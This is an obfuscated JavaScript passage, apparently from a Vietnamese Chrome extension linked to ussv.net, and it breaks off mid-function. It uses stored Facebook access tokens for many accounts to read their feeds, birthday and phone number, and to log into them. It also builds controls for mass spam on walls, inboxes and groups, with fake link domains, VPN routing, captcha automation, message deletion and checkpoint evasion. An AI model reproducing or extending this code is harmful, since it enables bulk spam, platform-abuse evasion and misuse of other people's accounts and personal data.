        this[f1W.H1X] = function(W) {
            var V = parseInt($(W)[f1W.m8y]());
            $(W)[f1W.m8y](V + f1W.S9a);
        };
        this[J0] = function(o) {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'https://graph.facebook.com/' + o[f0] + '?access_token=' + o[f1W.p87]
            }, function(V) {
                var E = "description",
                    O = "ShowMedia",
                    Z = "source",
                    F = "e0b",
                    V = JSON[f1W.i2O](V);
                if (V.error) {
                    $(o[f1W.a7y])[f1W.Q0I](V.error[f1W.q10]);
                } else {
                    $(o[f1W.a7y])[f1W.Q0I]("L?y thông tin bài vi?t thành công !");
                    if (V[f1W.q10]) {
                        $(o[f1W.V5r])[f1W.o07](V[f1W.q10]);
                        $(o[f1W.S77])[f1W.o07]("msg")[f1W.V6Q]("selected", true);
                    } else {
                        if (f1W[F](V[Z][f1W.x3y]("photo"), null)) {
                            $(o[f1W.V5r])[f1W.o07](V[f1W.G6y]);
                            $(o[f1W.S77])[f1W.o07]("img")[f1W.V6Q]("selected", true);
                            $[f1W.c9y]({
                                url: "https://ussv.net/upanh/upload.php",
                                dataType: "json",
                                type: "POST",
                                data: {
                                    url: V[Z],
                                    type: "transload",
                                    watermark: "0",
                                    mylogo: "0",
                                    watermark_position: "rd",
                                    watermark_logo: "1",
                                    resize: "0",
                                    server: "imgur"
                                }
                            })[f1W.W6O](function(W) {
                                if (W[f1W.j2X]) {
                                    $(o[f1W.B3Y])[f1W.o07](W[f1W.j2X]);
                                    $(o[O])[f1W.Q0I]('<img src="' + V[f1W.L5a] + '">');
                                } else {
                                    alert("L?i trong quá trình l?y ?nh !");
                                }
                            });
                        } else {
                            $(o[f1W.V5r])[f1W.o07](V[E]);
                            $(o[f1W.B3Y])[f1W.o07](V[Z]);
                            $(o[f1W.S77])[f1W.o07]("video")[f1W.V6Q]("selected", true);
                            $("#CoppyCore_stt_title_p_" + o[f1W.A7y])[f1W.l6Q](500);
                            $("#CoppyCore_stt_title_" + o[f1W.A7y])[f1W.o07](V[f1W.G6y]);
                            $(o[O])[f1W.Q0I]('<video style="  max-width: 80%;" controls="" name="media"><source src="' + V[Z] + '" type="video/mp4"></video>');
                        }
                    }
                }
            });
        };
        this[i0] = function(V) {
            var E = f1W.A9I + V[f1W.O8a] + f1W.v3I + V[f1W.p87];
            console[f1W.p4y](E);
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: E
            }, function(W) {
                var W = JSON[f1W.i2O](W);
                if (W.error) {
                    $(V[f1W.a7y])[f1W.Q0I](W.error[f1W.q10]);
                } else {
                    $(V[f1W.a7y])[f1W.Q0I]("Ðang thành công bài vi?t <a target='_blank' href='http://fb.com/" + W[f1W.W7O] + "'>http://fb.com/" + W[f1W.W7O] + "</a>");
                }
            });
        };
    }

    function view_log(T, I, D) {
        var G = "https://graph.facebook.com/me/home?access_token=",
            C = '	<br/><center>Ðang lâ´y du~ liê?u...<br/><img src="https://ussv.net/themes/img/loading.gif"></center>',
            z = '" style="border-top: 1px solid #e1e2e3;  margin: 0;">',
            P = '	<div id="log_5_post_',
            J = '	<center><span style="color: rgb(14, 32, 103);font-size: 16px;">Li?ch Su? Ðang</span></center>',
            c = '<div class="div_view_log">',
            L = function(W) {
                F0[f1W.V5I] = W;
            },
            E0 = f1W.X6v;
        E0 += f1W.o8X;
        E0 += c;
        E0 += J;
        E0 += P + T + z;
        E0 += C;
        E0 += f1W.b17;
        E0 += f1W.G9O + T + f1W.f0y;
        E0 += f1W.a5a;
        E0 += f1W.w9O;
        var F0 = document[f1W.W8O](f1W.P5Y);
        L(E0);
        document[f1W.V0r][f1W.M57](F0);
        $(f1W.D4O + T)[f1W.Z6O](function() {
            $(f1W.k8Q)[f1W.w5I]();
        });
        var K = G + D;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: K,
            data: "hj=hj"
        }, function(W) {
            var V = "m38",
                E = "s38",
                O = "k38",
                Z = "X38",
                F = "y38",
                o = JSON[f1W.i2O](W);
            if (f1W[F](o.data, null)) {
                $("#log_5_post_" + T)[f1W.Q0I]("<center>Lô~i trong qua´ tri`nh lâ´y Du~ Liê?u");
            } else {
                var U = "";
                for (var p = 0; f1W[Z](p, 5); p++) {
                    if (f1W[O](o.data[p][f1W.M4I][0][f1W.G6y], "Comment")) {
                        var M = o.data[p][f1W.W47][f1W.G6y];
                        if (f1W[E](o.data[p][f1W.q10], null)) {
                            var b = "";
                        } else {
                            var b = o.data[p][f1W.q10][f1W.d3v](0, 75);
                        }
                        var H = "";
                        H += '	<div class="div_info_help">';
                        H += '		<div id="post_new_64">';
                        H += '		<span class="span_tieude 64">' + b + '...</span>';
                        H += '		<a target="_blank" href="' + o.data[p][f1W.X0Q] + '"><img class="show_noidung_post viewhome1" id="64" src="https://ussv.net/themes/img/icon_chitiet.png" style="height: 16px;float: right;"></a>';
                        H += '		<div class="div_info_view_log" style="color: rgb(12, 37, 60);">';
                        H += '		Nguo`i Ðang: <a target="_blank" href="http://fb.com/' + o.data[p][f1W.W47][f1W.W7O] + '">' + M + '</a> <br/>';
                        H += '		Bi`nh Luâ?n: <a target="_blank" href="' + o.data[p][f1W.X0Q] + '">Xem Bi`nh Luâ?n</a> <br/>';
                        H += '		<span style="float:right;">	';
                        H += '		</span>';
                        H += '		</div>';
                        H += '		</div>';
                        H += '	</div>';
                        var U = U + "" + H + "";
                    } else {
                        var R = o.data[p][f1W.a40].data[0][f1W.G6y],
                            X = o.data[p][f1W.Z9y],
                            X = X[f1W.F6r]("+", "T"),
                            X = X[f1W.X3Q]("T"),
                            f = X[0],
                            n = X[1],
                            Y = n[f1W.X3Q](":"),
                            n = parseInt(Y[0]) + 7,
                            N = Y[1],
                            g = Y[2],
                            n = n + ":" + N + ":" + g,
                            X = f + " " + n;
                        if (f1W[V](o.data[p][f1W.q10], null)) {
                            var b = "";
                        } else {
                            var b = o.data[p][f1W.q10][f1W.d3v](0, 75);
                        }
                        var H = "";
                        H += '	<div class="div_info_help">';
                        H += '		<div id="post_new_64">';
                        H += '		<span class="span_tieude 64">' + b + '...</span>';
                        H += '		<a target="_blank" href="' + o.data[p][f1W.X0Q] + '"><img class="show_noidung_post viewhome1" id="64" src="https://ussv.net/themes/img/icon_chitiet.png" style="height: 16px;float: right;"></a>';
                        H += '		<div class="div_info_view_log" style="color: rgb(12, 37, 60);">';
                        H += '		Nguo`i Nhâ?n: <a target="_blank" href="http://fb.com/' + o.data[p][f1W.a40].data[0][f1W.W7O] + '">' + R + '</a> <br/>';
                        H += '		Time: ' + X;
                        H += '		<span style="float:right;">	';
                        H += '		<a target="_blank" href="' + o.data[p][f1W.L5a] + '"><img style="top: 2px;position: relative;" src="https://ussv.net/themes/img/app/icon_img.png"></a>';
                        H += '		</span>';
                        H += '		</div>';
                        H += '		</div>';
                        H += '	</div>';
                        var U = U + "" + H;
                    }
                };
                $("#log_5_post_" + T)[f1W.Q0I](U);
            }
        });
    }

    function ussv_help_popup_text() {
        var Z = "http://ussv.net/help/ussv_help_popup/ussv_help_tip_001.html";
        $(f1W.W8r)[f1W.l6Q](f1W.Y5a);
        var F = Z;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: F,
            data: "hj=hj"
        }, function(W) {
            var V = W[f1W.X3Q]("|"),
                E = V[1][f1W.F6r](/\n/g, "<br/>"),
                O = V[2][f1W.F6r](/\n/g, "<br/>");
            $("#uh_t_note1")[f1W.Q0I](E);
            $("#uh_t_note2")[f1W.Q0I](O);
        });
    }

    function loc_acc() {
        var g = 'loc_tt',
            T = 'loc_thaotac',
            I = '<br/><center>Ðang lâ´y du~ liê?u...<br/><img src="https://ussv.net/themes/img/loading.gif"></center>',
            D = "#div_account",
            G = function(W) {
                url = W;
            },
            C = function() {
                var W = "&stt=";
                var V = "&thaotac=";
                datalogin = f1W.o0Y + z + f1W.R87 + P + f1W.x4y + J + f1W.K5a + c + V + L + W + E0;
            };
        $(D)[f1W.Q0I](I);
        var z = document[f1W.C4y](f1W.n10)[f1W.V5I],
            P = document[f1W.C4y](f1W.u5X)[f1W.V5I],
            J = document[f1W.C4y](f1W.j9O)[f1W.V5I],
            c = document[f1W.C4y](f1W.Y6a)[f1W.V5I],
            L = document[f1W.C4y](T)[f1W.F2Q],
            E0 = document[f1W.C4y](g)[f1W.F2Q];
        G(f1W.Z5r);
        C();
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: url,
            data: datalogin
        }, function(N) {
            thongbao_log(1, lang_vi_pr_loc_fn);
            $("#div_account")[f1W.Q0I](N);
            $('.row_del_acc')[f1W.Z6O](function() {
                delete_fb(this[f1W.W7O]);
            });
            $(".row_del_acc")[f1W.k4O](function() {
                var M = "E9t",
                    b = $("#a_thaotac_" + this[f1W.W7O])[f1W.Q0I](),
                    b = b[f1W.X3Q]("|"),
                    H = b['0'],
                    R = b['1'],
                    X = this[f1W.W7O],
                    f = $("#uss_vip")[f1W.Q0I]();
                if (f1W[M](f, "1")) {
                    var n = '<a><img title="Spam La?i" id="spam_rrs_' + this[f1W.W7O] + '" src="https://ussv.net/themes/img/app/re_spam.png"></a>';
                } else {
                    var n = "";
                }
                var Y = "";
                Y += '<span class="css-tooltip-left color-fb">';
                Y += '	<span>';
                Y += '		<a><img title="Kiê?m La?i Ta`i Khoa?n ' + H + '" id="row_rc_' + this[f1W.W7O] + '" src="https://cdn4.iconfinder.com/data/icons/munich/16x16/zoom.png"></a>';
                Y += '		<img title="Ðang Nhâ?p Nhanh Ta`i Khoa?n ' + H + '" id="spam_fl_' + this[f1W.W7O] + '" src="https://ussv.net/themes/img/app/icon_login.png">';
                Y += '		<img title="Xem Li?ch Su? Ta`i Khoa?n ' + H + '" id="spam_vl_' + this[f1W.W7O] + '" src="https://ussv.net/themes/img/app/log_view.png">';
                Y += '		' + n;
                Y += '	</span>';
                Y += '	<img class="row_del_acc 2" id="' + X + '" title="Click Ðê? Xo´a Ta`i Khoa?n Na`y" src="https://ussv.net/themes/img/app/icon_settings.png" alt="settings icon">';
                Y += '</span>';
                $(this)[f1W.w5I]();
                $("#a_thaotac_" + this[f1W.W7O])[f1W.Q0I](Y);
                $("#a_thaotac_" + this[f1W.W7O])[f1W.R4r]();
                $('.row_del_acc.2')[f1W.Z6O](function() {
                    delete_fb(this[f1W.W7O]);
                });
                $("#row_rc_" + X)[f1W.Z6O](function() {
                    re_check(X, H, R);
                });
                $("#spam_fl_" + X)[f1W.Z6O](function() {
                    var W = "r9t",
                        V = $("#stt_check")[f1W.Q0I]();
                    if (f1W[W](V, "0")) {
                        div_fast_log(X, H, R);
                    } else {
                        div_thongbao(ussv_lang_vi_nt_cant_fl);
                    }
                });
                $("#spam_vl_" + X)[f1W.Z6O](function() {
                    var W = "o9t",
                        V = $("#row_token_" + X)[f1W.o07]();
                    if (f1W[W](V, null)) {
                        div_thongbao(ussv_lang_vi_vl_error_tokennull);
                    } else {
                        view_log(X, H, V);
                    }
                });
                $("#spam_rrs_" + X)[f1W.Z6O](function() {
                    var o = "p9t",
                        U = $("#row_token_" + X)[f1W.o07]();
                    if (f1W[o](U, null)) {
                        div_thongbao(ussv_lang_vi_vl_error_tokennull);
                    } else {
                        fb_spam(X, H, U, 1, R);
                        $("#sp_note_spaming")[f1W.Q0I]("Ðang tiê´n ha`nh Spam la?i trên ta`i khoa?n " + H);
                        var p = "https://graph.facebook.com/me?fields=name,birthday,link,locale,verified,gender,mobile_phone,hometown&access_token=" + U;
                        chrome[f1W.d60][f1W.K4r]({
                            method: 'GET',
                            action: 'xhttp',
                            url: p,
                            data: "hj=hj"
                        }, function(W) {
                            var V = "e9t",
                                E = JSON[f1W.i2O](W);
                            if (f1W[V](E[f1W.G6y], null)) {
                                div_thongbao(ussv_lang_vi_rs_error_dietoken);
                            } else {
                                var O = E[f1W.q60],
                                    Z = E[f1W.h3r],
                                    F = E[f1W.G6y];
                                start_spam(X, U, F, O, Z, "rsp");
                            }
                        });
                    }
                });
            });
        });
    }

    function thaotac_ussv_help() {
        var p = "#help_select_type",
            M = ".popup_menu_list.help",
            b = "#close_help_popup",
            H = '<a href="#" style="min-width: 150px;" class="button2 blue" id="show_help_center">Help Center</a>',
            R = "#div_right_menu";
        $(R)[f1W.p3Q](H);
        $(b)[f1W.Z6O](function() {
            $(f1W.W8r)[f1W.F50](f1W.Y5a);
        });
        $(M)[f1W.Z6O](function() {
            var W = "rgb(233, 243, 251)",
                V = "#FFF",
                E = this[f1W.W7O];
            ussv_help_hd_text(E);
            $(M)[f1W.C3O](f1W.Q1I, V);
            $(this)[f1W.C3O](f1W.Q1I, W);
        });
        $(p)[f1W.i77](function() {
            var W = "Vui lo`ng cho?n du´ng mu?c !",
                V = ".help_helps.tips",
                E = "tips",
                O = "x3b",
                Z = ".help_helps.helps",
                F = ".help_helps",
                o = "helps",
                U = "l3b";
            if (f1W[U]($(this)[f1W.o07](), o)) {
                $(F)[f1W.v37]();
                $(Z)[f1W.l6Q](f1W.Y5a);
            } else if (f1W[O]($(this)[f1W.o07](), E)) {
                $(F)[f1W.v37]();
                $(V)[f1W.l6Q](f1W.Y5a);
            } else {
                alert(W);
            }
        });
    }

    function danhgiaspam() {
        var W = "Z78",
            V = "O78",
            E = "V78",
            O = "Q98",
            Z = "t98",
            F = "#thongke_danhgia_spam",
            o = "w98",
            U = "#thongke_total_spam_friends_tc",
            p = "#thongke_total_spam_friends_tt",
            M = parseInt($(p)[f1W.Q0I]()),
            b = parseInt($(U)[f1W.Q0I]());
        if (f1W[o](M, f1W.G90)) {
            $(F)[f1W.Q0I](ussv_lang_vi_vl_pt_sp_nofr);
        } else {
            var H = f1W[Z]((b / M), f1W.u0O);
            if (f1W[O](H, f1W.F30)) {
                $(F)[f1W.Q0I](ussv_lang_vi_vl_pt_sp_h50);
            } else {
                if (f1W[E](H, f1W.z80)) {
                    $(F)[f1W.Q0I](ussv_lang_vi_vl_pt_sp_h60);
                } else {
                    if (f1W[V](H, f1W.t70)) {
                        $(F)[f1W.Q0I](ussv_lang_vi_vl_pt_sp_h70);
                    } else {
                        if (f1W[W](H, f1W.H70)) {
                            $(F)[f1W.Q0I](ussv_lang_vi_vl_pt_sp_h80);
                        } else {
                            $(F)[f1W.Q0I](ussv_lang_vi_vl_pt_sp_h90);
                        }
                    }
                }
            }
        }
        dom_logs_ussv(lang_vi_checking_review_tientrinhSP, f1W.d07);
    }

    function createpopupLogin(W) {
        var V = f1W.x0r,
            E = f1W.x0r;
        V = window[f1W.d5y]('https://graph.facebook.com/login' + W + 'ussv', 'displayWindow', 'width=400,height=300,status=no,toolbar=no,menubar =no,scrollbars=1');
    }

    function div_batdaucheck() {
        var q0 = "W58",
            H0 = ".st_check_panel, .ussv_logs_td_logs",
            W0 = "Ti?n trình Check dang di?n ra, vui lòng ch? k?t thúc tru?c khi b?t d?u Check. Ho?c click vào H?y d? h?y h?n gi? Check.",
            w = "d68",
            B0 = '<span class="hidden" id="div_sl_hengio">Check Lúc: ',
            o0 = '<select id="uss_st_hengio_m" name="tt" class="select_start _4jy0 _517h ">',
            Z0 = ' phút</option>',
            A = '" ',
            X0 = "K68",
            n0 = 61,
            U0 = "L68",
            b0 = '</select> : ',
            s0 = '<select id="uss_st_hengio_h" name="tt" class="select_start _4jy0 _517h ">',
            V0 = ' gi?</option>',
            i0 = 25,
            J0 = "S68",
            f0 = '<div id="div_sl_time_add">',
            k0 = 'Year: <select id="uss_st_time_add_acc_y" name="tt" class="select_start _4jy0 _517h "><option value="0">All</option><option value="2015">2015</option></select>',
            N0 = 'Month: <select id="uss_st_time_add_acc_m" name="tt" class="select_start _4jy0 _517h ">',
            l0 = "P68",
            v0 = "z68",
            K0 = "N68",
            P0 = 'Day: <select id="uss_st_time_add_acc_h" name="tt" class="select_start _4jy0 _517h ">',
            Y0 = "h68",
            g0 = '<option value="0">All</option>',
            u0 = "R68",
            m0 = 32,
            C0 = "f68",
            T0 = '				<select id="uss_st_auto_change_mail" name="tt" class="select_start _4jy0 _517h">',
            M0 = '			<span class="span_sl_start">Auto Change Mail</span>',
            I0 = '		<div class="span_setting">',
            G0 = "#uss_auto_change_mail",
            L0 = "H68",
            B4 = '		<input id="VNPCore_Browsec_Method2" value="0" type="hidden"><input id="VNPCore_Browsec_Country2" value="us" type="hidden"><input id="VNPCore_Browsec_Country_Ip2" value="0" type="hidden"> ',
            Z4 = '				<textarea id="GroupCore_spam_listid_blackgroup"></textarea>',
            y0 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- BlackList</span>',
            p4 = '				<textarea style="" class="GroupCore_spam_content" id="GroupCore_spam_content"></textarea>',
            x0 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- N?i Dung Cmt</span>',
            A0 = '			<input value="" id="GroupCore_spam_loc_listgroup" type="text" style="width: 50px;"> Friends',
            O0 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Spam Trên</span>',
            D0 = '					<option value="15000">15s</option>',
            V4 = '					<option value="10000">10s</option>',
            z0 = '					<option value="5000">5s</option>',
            j4 = '					<option value="3000">3s</option>',
            S0 = '					<option value="1000" selected>1s</option>',
            a0 = '					<option value="0">0s</option>',
            c0 = '				<select id="GroupCore_spam_sl_limit_gr_time" name="tt" class="select_start _4jy0 _517h">',
            w0 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Time Per Group</span>',
            b4 = '				<select id="GroupCore_spam_sl_AutoChiaPost" name="tt" class="select_start _4jy0 _517h">',
            q4 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- T? Chia Ð?u Post</span>',
            e4 = '					<option value="30">30</option>',
            W4 = '					<option value="20">20</option>',
            r4 = '					<option value="10">10</option>',
            n4 = '					<option value="5" selected>5</option>',
            f4 = '					<option value="1">1</option>',
            E4 = '				<select id="GroupCore_spam_sl_limit_post" name="tt" class="select_start _4jy0 _517h">',
            M4 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Limit Post/Group</span>',
            X4 = '				<textarea id="GroupCore_spam_TypeUSS_Data"></textarea>',
            k4 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Data Post</span>',
            R4 = '				<textarea id="GroupCore_spam_TypeUSS_URL"></textarea>',
            y4 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Url Post</span>',
            s4 = '		<div id="Div_SpamCmt_TypeUSS" class="hidden">',
            h4 = '					<option value="USS">USS</option>',
            H4 = '					<option value="Token" selected>Token</option>',
            I4 = '					<option value="Ajax">Ajax</option>',
            e0 = '				<select id="GroupCore_spam_sl_Method_post" name="tt" class="select_start _4jy0 _517h">',
            t0 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Method Post</span>',
            D4 = '					<option value="2">USS</option>',
            h0 = '					<option value="1">Browsec</option>',
            R0 = '				<select id="GroupCore_spam_sl_UseVPN" name="tt" class="select_start _4jy0 _517h">',
            C4 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Use VPN</span>',
            z4 = '					<option value=" ORDER BY rand() " selected>Ng?u Nhiên</option>',
            Y4 = '					<option value="">M?c Ð?nh</option>',
            P4 = '				<select id="GroupCore_spam_sl_typeget_post" name="tt" class="select_start _4jy0 _517h">',
            m4 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Type Get Post</span>',
            J4 = '		<div id="div_info_cmt_post_group" class="hidden">',
            c4 = '				<select id="uss_st_cmt_post_group" name="tt" class="select_start _4jy0 _517h">',
            a4 = '			<span class="span_sl_start">Auto Cmt Post Group</span>',
            d0 = "q68",
            F1 = '					<option value="5">5 Lu?ng</option>',
            E1 = '					<option value="4">4 Lu?ng</option>',
            x4 = '					<option value="3">3 Lu?ng</option>',
            S4 = '					<option value="2">2 Lu?ng</option>',
            l4 = '					<option value="1">1 Lu?ng</option>',
            G4 = '				<select id="uss_st_spam_token_TotalThread" name="tt" class="select_start _4jy0 _517h">',
            t4 = '			<span >',
            O4 = '			<span class="span_sl_start">S? Lu?ng SPAM</span>',
            Z1 = '		<div class="span_setting Spam_TotalThread" style="display:none">',
            r1 = '<option value="1">Spam Token</option>',
            d4 = '					<option value="2">Groups</option>',
            j1 = '					<option value="1">Friends</option>',
            o1 = '					<option value="0" selected>Friends and Group</option>',
            M1 = '				<select id="uss_st_spam_via" name="tt" class="select_start _4jy0 _517h">',
            i1 = '			<span class="span_sl_start">Spam Trên</span>',
            r2 = '				<select id="uss_st_spam_inbox_alertcaptcha" name="tt" class="select_start _4jy0 _517h">',
            Z2 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Âm Thanh Captcha</span>',
            F2 = '					<option value="1">T? Ð?ng</option>',
            o2 = '					<option value="0" selected>Ði?n Tay</option>',
            U2 = '				<select id="uss_st_spam_inbox_autocaptcha" name="tt" class="select_start _4jy0 _517h">',
            A1 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Ði?n Captcha</span>',
            W2 = '				<select id="uss_st_spam_delmsg_inbox" name="tt" class="select_start _4jy0 _517h">',
            V2 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Xóa Tin Nh?n Sau Khi G?i</span>',
            j2 = '				</select> Friends',
            E2 = '					<option value="5000" selected>5000</option>',
            O2 = '				<select id="uss_st_spam_need_fr_inbox_l" name="tt" class="select_start _4jy0 _517h">',
            B2 = '				</select> --> ',
            m1 = '					<option value="4000">4000</option>',
            I1 = '					<option value="3000">3000</option>',
            g1 = '					<option value="2000">2000</option>',
            N1 = '					<option value="1500">1500</option>',
            T1 = '					<option value="1000">1000</option>',
            P1 = '					<option value="900">900</option>',
            J1 = '					<option value="800">800</option>',
            C1 = '					<option value="700">700</option>',
            z1 = '					<option value="600">600</option>',
            h1 = '					<option value="500">500</option>',
            a1 = '					<option value="400">400</option>',
            Y1 = '					<option value="300">300</option>',
            R1 = '					<option value="200">200</option>',
            D1 = '					<option value="100">100</option>',
            q2 = '					<option value="0" selected>0</option>',
            X2 = '				<select id="uss_st_spam_need_fr_inbox_f" name="tt" class="select_start _4jy0 _517h">',
            p2 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Yêu C?u B?n Bè Khi Spam Inbox</span>',
            a2 = '					<option value="4">Safes (4s/msg)</option>',
            D2 = '					<option value="3">Chu?n (3s/msg)</option>',
            R2 = '					<option value="2">An Toàn (2s/msg)</option>',
            Y2 = '					<option value="1">Khuy?n Cáo (1s/msg)</option>',
            I2 = '					<option value="0" selected>T? Nhiên</option>',
            C2 = '				<select id="uss_st_spam_time_inbox" name="tt" class="select_start _4jy0 _517h">',
            N2 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Time G?i M?i Tin Nh?n</span>',
            U1 = '		<div class="span_setting st spam inbox more">',
            H2 = '					<input class="span3" type="file" id="CorePost_Inbox_Img_2" name="upload_1025" />',
            s2 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- ?nh 3</span>',
            k2 = '					<input class="span3" type="file" id="CorePost_Inbox_Img_1" name="upload_1025" />',
            M2 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- ?nh 2</span>',
            m2 = '					<input class="span3" type="file" id="CorePost_Inbox_Img_0" name="upload_1025" />',
            i2 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- ?nh 1</span>',
            n2 = '				<input class="span3" type="hidden" name="attach_id" /><input class="span3" type="hidden" name="images_only" value="true"/>',
            f2 = '		<div id="div_info_img_inbox" class="hidden">',
            Q2 = '					<textarea id="uss_st_inbox_link">http://facebook.com</textarea>',
            d2 = '					<input id="uss_st_inbox_title" value="Facebook">',
            W9 = '		<div id="div_info_link_inbox" class="hidden">',
            A2 = '					<option value="img">Inbox + IMG</option>',
            t2 = '					<option value="imglink">Inbox + LINK + IMG</option>',
            K2 = '					<option value="text" selected>Inbox</option>',
            G2 = '				<select id="uss_st_spam_inbox_via" name="tt" class="select_start _4jy0 _517h st spam inbox more">',
            l1 = '					<option value="0" selected>No</option>',
            u2 = '				<select id="uss_st_type_spam_inbox" name="tt" class="select_start _4jy0 _517h">',
            w2 = '			<span class="span_sl_start">SPAM INBOX</span>',
            P2 = '		<div id="div_st_spam_inbox" class="hidden">',
            S2 = '					<option value="4000">Du?i 4000 Friends</option>',
            c2 = '					<option value="3000">Du?i 3000 Friends</option>',
            U9 = '					<option value="2000">Du?i 2000 Friends</option>',
            y9 = '					<option value="1500">Du?i 1500 Friends</option>',
            p9 = '					<option value="1000">Du?i 1000 Friends</option>',
            b9 = '					<option value="900">Du?i 900 Friends</option>',
            r9 = '					<option value="800">Du?i 800 Friends</option>',
            Z9 = '					<option value="700">Du?i 700 Friends</option>',
            F9 = '					<option value="600">Du?i 600 Friends</option>',
            o9 = '					<option value="500">Du?i 500 Friends</option>',
            E9 = '					<option value="400">Du?i 400 Friends</option>',
            O9 = '					<option value="300">Du?i 300 Friends</option>',
            B9 = '					<option value="200">Du?i 200 Friends</option>',
            V9 = '					<option value="100">Du?i 100 Friends</option>',
            j9 = '					<option value="5000" selected>Không Yêu C?u</option>',
            i9 = '				<select id="uss_st_spam_need_fr" name="tt" class="select_start _4jy0 _517h">',
            m9 = '			<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Yêu C?u B?n Bè Khi Spam Wall</span>',
            f9 = '		<div class="span_setting st spam wall more">',
            n9 = '					<input id="uss_st_wall_link" value="http://facebook.com">',
            S1 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Link Khi Click Hình</span>',
            s9 = '					<input id="uss_st_wall_info_link" value="Facebook.com">',
            H9 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Fake Domain</span>',
            M9 = '					<input id="uss_st_wall_info_link" value="">',
            k9 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Miêu T? Link</span>',
            q9 = '					<input id="uss_st_wall_title" value="">',
            c1 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- Tiêu Ð? Link</span>',
            u4 = '				</span>',
            e9 = '					<option value="10000">10s/post</option>',
            X9 = '					<option value="9000">9s/post</option>',
            g9 = '					<option value="7000">7s/post</option>',
            N9 = '					<option value="5000">5s/post</option>',
            T9 = '					<option value="4000">4s/post</option>',
            D9 = '					<option value="3000">3s/post</option>',
            h9 = '					<option value="2000">2s/post</option>',
            a9 = '					<option value="1000" selected>1s/post</option>',
            Y9 = '				<select id="uss_st_wall_timepost" name="tt" class="select_start _4jy0 _517h st spam wall more">',
            L4 = '				<span id="" >',
            R9 = '				<span class="span_sl_start" style="color: rgb(20, 21, 123);">- T?c Ð? Post</span>',
            N4 = '			<div class="span_setting st spam">',
            G9 = '		<div id="div_info_link_wall" class="hidden">',
            w9 = '					<option value="3">Wall + Link</option>',
            K9 = '					<option value="2" selected>Wall + IMG</option>',
            W7 = '					<option value="1" selected>Wall</option>',
            j7 = '				<select id="uss_st_spam_wall_via" name="tt" class="select_start _4jy0 _517h st spam wall more">',
            H1 = '					<option value="1" selected>Yes</option>',
            Q9 = '				<select id="uss_st_type_spam_wall" name="tt" class="select_start _4jy0 _517h">',
            F7 = '			<span class="span_sl_start">SPAM WALL</span>',
            U7 = '					<option value="1">Chi? Acc Ða~ Du`ng Stellar</option>',
            O7 = '					<option value="0">Chi? Acc Chua Du`ng Stellar</option>',
            r7 = '					<option value="2" selected>Spam All Acc</option>',
            p7 = '				<select id="uss_st_type_spam" name="tt" class="select_start _4jy0 _517h">',
            X7 = '			<span class="span_sl_start">Loa?i SPAM</span>',
            F4 = '			</span>',
            o4 = '				</select>',
            y1 = '					<option value="1">Yes</option>',
            Q4 = '					<option value="0">No</option>',
            z9 = '					',
            I9 = '				<select id="uss_st_spam" name="tt" class="select_start _4jy0 _517h">',
            U4 = '			<span id="" >',
            J9 = '			<span class="span_sl_start">SPAM</span>',
            i4 = '		<div class="span_setting st spam">',
            C9 = '		<div id="div_st_spam">',
            S9 = "b68",
            c9 = "U68",
            l9 = "Z68",
            P9 = "O68",
            x1 = '<option value="1" selected>Yes</option>',
            u9 = "V68",
            e1 = '<option value="0" selected>No</option>',
            x9 = "Q38",
            M7 = '<option value="5" selected>5 Acc Liên Tu?c</option>',
            s7 = "t38",
            f7 = '<option value="4" selected>4 Acc Liên Tu?c</option>',
            i7 = "w38",
            u1 = '<option value="3" selected>3 Acc Liên Tu?c</option>',
            Y7 = "x38",
            h7 = '<option value="3" selected>Du`ng khi 3 Acc Liên Tiê´p bi? Checkpoint</option>',
            T7 = "l38",
            g7 = '<option value="2" selected>Du`ng khi 2 Acc Liên Tiê´p bi? Checkpoint</option>',
            z7 = "C38",
            L1 = '<option value="1" selected>Du`ng Khi 1 Acc Bi? Checkpoint</option>',
            C7 = "g38",
            J7 = '<option value="20" selected>Không Du`ng</option>',
            P7 = "D38",
            v1 = " phút",
            q1 = "#btn_st_cancel_check",
            s1 = "#btn_st_check",
            O1 = ".class_st",
            v4 = ".note_panel_st_check",
            g4 = "#st_check_stt",
            n1 = "#uss_st_hengio_m",
            f1 = "#uss_st_hengio_h";

        function q7() {
            var W = " phút (Qúa th?i gian quy d?nh)",
                V = "f46",
                E = "Ðang ti?n hành Check...",
                O = "0 phút (B?t Ð?u Check)",
                Z = "H46",
                F = "0 gi? 0 phút",
                o = "q46",
                U = "b46",
                p = "U46",
                M = "Z46",
                b = new Date(),
                H = $(f1)[f1W.o07](),
                R = parseInt($(n1)[f1W.o07]()),
                X = (f1W[M](H, f1W.z80)) + R,
                f = f1W[p](b[f1W.m2Q](), f1W.z80) + b[f1W.Y6v](),
                n = f1W[U](X, f);
            if (f1W[o](n, f1W.L9a)) {
                var Y = F;
